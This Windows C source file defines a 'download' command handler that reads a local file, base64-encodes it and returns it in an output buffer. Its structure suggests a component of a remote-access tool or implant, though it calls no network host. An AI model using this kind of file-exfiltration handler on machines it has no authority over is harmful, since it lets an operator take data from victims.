#include "commands.h"
#include "crypto.h"
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int cmd_download(const char *local_path, char *output_buf, size_t output_size)
{
    if (!local_path || !output_buf) return -1;

    HANDLE fh = CreateFileA(
        local_path,
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (fh == INVALID_HANDLE_VALUE) {
        snprintf(output_buf, output_size,
                 "[download] Cannot open %s: error %lu\n",
                 local_path, GetLastError());
        return -1;
    }

    LARGE_INTEGER file_size_li;
    if (!GetFileSizeEx(fh, &file_size_li)) {
        CloseHandle(fh);
        snprintf(output_buf, output_size, "[download] GetFileSizeEx failed\n");
        return -1;
    }

    LONGLONG file_size = file_size_li.QuadPart;

    size_t max_raw = (output_size - 64) * 3 / 4;
    if ((LONGLONG)max_raw < file_size) {
        snprintf(output_buf, output_size,
                 "[download] File too large (%lld bytes, max %zu). "
                 "Use chunked download.\n",
                 file_size, max_raw);
        CloseHandle(fh);
        return -1;
    }

    uint8_t *raw = malloc((size_t)file_size);
    if (!raw) {
        CloseHandle(fh);
        snprintf(output_buf, output_size, "[download] malloc failed\n");
        return -1;
    }

    DWORD bytes_read = 0;
    BOOL  ok = ReadFile(fh, raw, (DWORD)file_size, &bytes_read, NULL);
    CloseHandle(fh);

    if (!ok || bytes_read != (DWORD)file_size) {
        free(raw);
        snprintf(output_buf, output_size, "[download] ReadFile failed: %lu\n",
                 GetLastError());
        return -1;
    }

    char *b64 = base64_encode(raw, (size_t)file_size);
    free(raw);

    if (!b64) {
        snprintf(output_buf, output_size, "[download] base64_encode failed\n");
        return -1;
    }

    /* Output format: "[download] path:<path>\n<b64_content>" */
    int hdr_len = snprintf(output_buf, output_size,
                            "[download] path:%s\n", local_path);
    if (hdr_len < 0 || (size_t)hdr_len >= output_size) {
        free(b64);
        return -1;
    }

    size_t b64_len = strlen(b64);
    size_t avail   = output_size - (size_t)hdr_len - 1;
    if (b64_len > avail) b64_len = avail;

    memcpy(output_buf + hdr_len, b64, b64_len);
    output_buf[hdr_len + b64_len] = '\0';
    free(b64);
    return 0;
}
